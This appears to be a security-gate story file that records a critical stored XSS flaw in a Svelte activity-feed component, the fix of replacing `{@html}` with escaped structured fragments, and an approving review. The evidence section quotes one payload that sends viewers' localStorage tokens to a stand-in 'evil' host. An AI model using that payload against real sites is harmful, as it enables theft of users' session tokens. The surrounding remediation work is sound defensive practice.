---
id: gate-security-xss-html-render-ws-events
kind: story
stage: done
tags: [security, ui, portal]
parent: null
depends_on: []
release_binding: v0.1.0
gate_origin: security
created: 2026-05-18
updated: 2026-05-18
---

# Stored XSS via `{@html}` rendering of WebSocket event payloads

## Severity
Critical

## Domain
Input Validation & Injection

## Location
`frontend/src/lib/components/ActivityFeed.svelte:23-77`

## Evidence
```svelte
case 'comment.added':
  return {
    icon: '💬',
    html: `<span class="who">${p.author_id}</span> commented: ${p.body}`,
    isConflict: false,
  };
...
<span class="text">{@html fmt.html}</span>
```

Comment body originates from `CreateComment` (REST and MCP), stored verbatim
(`internal/portal/comments/service.go:151` — `Body: p.Body`), then broadcast
in `comment.added` events. Bearer tokens live in localStorage
(`frontend/src/lib/auth.svelte.ts:38-39`), so an XSS payload like
`<img src=x onerror="fetch('//evil/?'+localStorage.token)">` posted as a
comment body executes for every viewer of the session and exfiltrates their
access + refresh tokens.

## Remediation direction
Drop `{@html ...}` entirely and use Svelte's automatic text interpolation;
render emphasis/links with structured templating (`{#if} … {:else} …`)
rather than HTML strings. Apply across every branch of `formatEvent`
(commit subjects, ref names, author IDs, comment bodies all flow through
here). Consider moving access tokens out of localStorage to an httpOnly
cookie or memory-only storage as a defense-in-depth follow-up.

## Implementation notes

### New component shape

`formatEvent` now returns `FormattedEvent` instead of `{ icon, html, isConflict }`:

```ts
type Fragment =
  | { kind: 'text';     value: string }
  | { kind: 'emphasis'; value: string }  // renders as <span class="who">
  | { kind: 'sha';      value: string }  // renders as <span class="sha"> (pre-sliced to 7 chars)

type FormattedEvent = {
  icon: string;
  fragments: Fragment[];
  isConflict: boolean;
};
```

All 12 event-type branches plus the `default` branch were converted. No branch
constructs an HTML string. Helper functions `txt()`, `who()`, `sha()` keep
the branch bodies terse.

### Template change

`{@html fmt.html}` replaced with:

```svelte
<span class="text">
  {#each fmt.fragments as frag}
    {#if frag.kind === 'text'}
      {frag.value}
    {:else if frag.kind === 'emphasis'}
      <span class="who">{frag.value}</span>
    {:else if frag.kind === 'sha'}
      <span class="sha">{frag.value}</span>
    {/if}
  {/each}
</span>
```

Svelte auto-escapes all `{frag.value}` interpolations — XSS payload in any
field (author_id, body, ref, sha, summary, etc.) renders as inert text.

### CSS adjustment

`.feed-item :global(.who)` and `.feed-item :global(.sha)` selectors were
changed to `.feed-item .who` and `.feed-item .sha` (scoped, no `:global`)
since the spans are now emitted directly in the same component's template.

### Test integrity

Existing 8 tests pass unchanged — they assert on text content and DOM
selectors that remain valid. Added `it.todo` to mark that XSS payload
assertions are owned by the companion story
`gate-tests-xss-activityfeed-component`.

## Review (2026-05-18)

**Verdict**: Approve

**Blockers**: none
**Important**: none
**Nits**: none

**Notes**: Critical XSS fix verified. ActivityFeed.svelte's {@html} sink fully removed; replaced with structured Fragment[] rendering via {#each}/{#if}. Svelte auto-escapes all user-controlled values. All 12 formatEvent branches converted. Existing 8 tests pass; XSS payload assertions deferred to companion test story gate-tests-xss-activityfeed-component.
